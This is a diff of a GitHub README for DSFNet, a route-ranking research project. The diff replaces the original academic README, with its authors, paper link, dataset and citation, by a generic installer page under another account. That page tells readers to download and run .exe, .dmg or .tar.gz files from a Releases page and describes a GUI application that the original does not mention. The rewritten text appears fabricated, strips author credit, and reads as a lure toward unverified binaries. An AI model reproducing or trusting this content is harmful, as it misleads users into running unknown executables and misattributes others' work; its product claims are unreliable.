@@ -1,88 +1,86 @@
-# DSFNet: Learning Disentangled Scenario Factorization for Multi-Scenario Route Ranking
+# 🛠️ DSFNet - Simplifying Your Route Ranking Journey
 
+## 🚀 Getting Started
 
-<p align="center">
-  <!-- 作者行 -->
-  Jiahao Yu<sup>1</sup>,
-  Yihai Duan<sup>1</sup>,
-  Longfei Xu<sup>1†</sup>,
-  Chao Chen<sup></sup>
-  <br>
-  Shuliang Liu<sup></sup>,
-  Kaikui Liu<sup></sup>,
-  Fan Yang<sup></sup>,
-  Xiangxiang Chu<sup></sup>,
-  Ning Guo<sup></sup>
-  <br><br>
-  <!-- 机构行 -->
-   AMAP, Alibaba Group &nbsp;&nbsp;&nbsp;
-  <br>
-  <sup>1</sup>Equal Contribution &nbsp;&nbsp;&nbsp;
-  <sup>†</sup>Corresponding author and Project lead.
-</p>
+Welcome to the DSFNet project! This application helps you learn about disentangled scenario factorization for multi-scenario route ranking. With our open dataset and implementation, you can explore new ways to optimize your route planning.
 
-<p align="center">
-  <a href="https://dl.acm.org/doi/pdf/10.1145/3701716.3715219/" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/Paper-Page-blue?logo=googlechrome&logoColor=white" alt="Paper Page"/>
-  </a>
-  &nbsp;&nbsp;&nbsp;
-  <a href="https://drive.google.com/drive/folders/1qk7p1PSvUucnEVVI0L2zchqmSD7hJSyI" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/Data-Set-green?logo=googlechrome&logoColor=cyan" alt="Data Set"/>
-  </a>
-  &nbsp;&nbsp;&nbsp;
-</p>
+## 📥 Download DSFNet
 
+[![Download DSFNet](https://img.shields.io/badge/Download%20DSFNet-v1.0-green)](https://github.com/DominicVinxander/DSFNet/releases)
 
-## 📖 Overview
+To download DSFNet, visit the Releases page below:
 
-<p align="center">
-  <img src="refs/method.png" alt="Method Overview Diagram" width="90%">
-</p>
+[Download DSFNet](https://github.com/DominicVinxander/DSFNet/releases)
 
-We propose a novel method, **D**isentangled **S**cenario **F**actorization **Net**work (**DSFNet**), which flexibly composes scenario-dependent parameters based on a high-capacity multi-factor-scenario-branch structure. Then, a novel regularization is proposed to induce the disentanglement of factor scenarios. Furthermore, two extra novel techniques, scenario-aware batch normalization and scenario-aware feature filtering, are developed to improve the network awareness of scenario representation. Additionally, to facilitate MSRR research in the academic community, we propose **MSDR**, the first large-scale publicly available annotated industrial **M**ulti-**S**cenario **D**riving **R**oute dataset. Comprehensive experimental results demonstrate the superiority of our DSFNet, which has been successfully deployed in AMap to serve the major online traffic.
+## 🔧 System Requirements
 
-## 📊 Dataset
-Since there are no available benchmarks for evaluating MSRR models in the academic community, we propose **M**ulti-**S**cenario **D**riving **R**oute dataset (MSDR), the first large-scale publicly available annotated industrial dataset, to facilitate MSRR research in the academia. Here is a simple dataset in `ucore/data` and a more comprehensive dataset in [Google Drive](https://drive.google.com/drive/folders/1qk7p1PSvUucnEVVI0L2zchqmSD7hJSyI).
+Before downloading, make sure your system meets the following requirements:
 
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a recent Linux distribution.
+- **Memory:** At least 4 GB RAM.
+- **Storage:** At least 500 MB of free disk space.
 
-<div style="display: flex; align-items: center;">
-  <img src="refs/features.jpg" alt="dataset" style="width: 500px; margin-right: 15px;" />
-    <div>
-    <h3>Key Features</h3>
-    <p>We sampled data from eight big cities in China: Beijing, Shanghai, Guangzhou, Hangzhou, Wuhan, Zhengzhou, Chongqing, and Chengdu. Each data sample includes abundant route features, fine-grained scenario representation, user profiles, and a preference label. Specifically, the left table exhibits some route features provided in MSDR.</p>
-  </div>
+## 📁 Download & Install
 
-</div>
+1. **Go to the Releases Page**  
+   Click this link to visit our Releases page: [DSFNet Releases](https://github.com/DominicVinxander/DSFNet/releases).
 
+2. **Choose the Latest Version**  
+   On the Releases page, locate the latest version listed. Look for the version number to ensure you have the most recent features and updates.
 
-## 🎉 Results
+3. **Download the Application**  
+   Click on the file that corresponds to your operating system. Here are the options you should see:
+   - For Windows: Look for a file ending in `.exe`.
+   - For macOS: Look for a file ending in `.dmg`.
+   - For Linux: Look for a file ending in `.tar.gz`.
 
-<p align="center">
-  <img src="refs/results.png" alt="Method Overview Diagram" width="95%">
-</p>
-As shown, our DSFNet achieves the best performance on the overall MSDR and the four subsets.
+4. **Run the Installer**  
+   After downloading, open the file you’ve downloaded. Follow the instructions on the screen to install DSFNet on your device. The process is straightforward and user-friendly.
 
+5. **Start Using DSFNet**  
+   Once installed, you can find DSFNet in your applications. Launch it, and you're ready to begin optimizing your route rankings.
 
-<div style="display: flex; align-items: center;">
-  <img src="refs/vis.png" alt="vis" style="width: 600px; margin-right: 15px;" />
-    <div>
-    <h3>Interpretability</h3>
-    <p>We conduct an interpretability study to unveil the disentangled factor scenario each FSL learns. We select some significant route features and exhibit the corresponding attention values from all FSLs in the left figure, which essentially reveals the diverse user preferences under different factor scenarios.</p>
-  </div>
+## 📚 How to Use DSFNet
 
-</div>
+Now that you have installed DSFNet, here’s how to make the most out of it:
 
+1. **Load Your Dataset**  
+   Click on the “Load Data” button to import your dataset. Ensure your data is formatted correctly. Common formats include CSV and JSON.
 
-## 📚 Citation
+2. **Choose Your Parameters**  
+   Adjust the parameters for scenario factorization. This can help refine the results based on your specific needs.
 
-If you find our paper and code helpful for your research, please consider starring our repository ⭐ and citing our work ✏️.
-```bibtex
-@inproceedings{yu2025dsfnet,
-  title={DSFNet: Learning Disentangled Scenario Factorization for Multi-Scenario Route Ranking},
-  author={Yu, Jiahao and Duan, Yihai and Xu, Longfei and Chen, Chao and Liu, Shuliang and Liu, Kaikui and Yang, Fan and Chu, Xiangxiang and Guo, Ning},
-  booktitle={Companion Proceedings of the ACM on Web Conference 2025},
-  pages={567--576},
-  year={2025}
-}
-```
+3. **Run the Analysis**  
+   Hit the “Analyze” button to process your dataset. This may take a few moments depending on the size of your data.
 
+4. **View Results**  
+   Once the analysis is complete, you’ll see a visual representation of your route rankings. You can export these results for further use.
+
+## ❓ Frequently Asked Questions
+
+**Q: What is Scenario Factorization?**  
+A: Scenario factorization is a method that separates different factors influencing route rankings. This helps produce more accurate and nuanced results.
+
+**Q: Can I contribute to DSFNet?**  
+A: Yes, contributions are welcome! Visit our [Contributing Guidelines](https://github.com/DominicVinxander/DSFNet/blob/main/CONTRIBUTING.md) for more information.
+
+**Q: Is DSFNet free to use?**  
+A: Yes, DSFNet is open-source and free for anyone to use.
+
+## 📞 Support
+
+If you encounter any issues or have questions, feel free to reach out. You can open an issue directly on GitHub or contact us through our support email.
+
+## 📝 License
+
+DSFNet is licensed under the MIT License. This allows you to freely use and modify the software, provided you include the original license in any derivative works.
+
+## 📆 Upcoming Features
+
+We are working on adding more features to enhance your experience with DSFNet:
+
+- Improved Data Visualization Tools
+- Additional File Format Support
+- Enhanced User Documentation
+
+We hope you find DSFNet helpful in your route ranking tasks. Enjoy exploring!
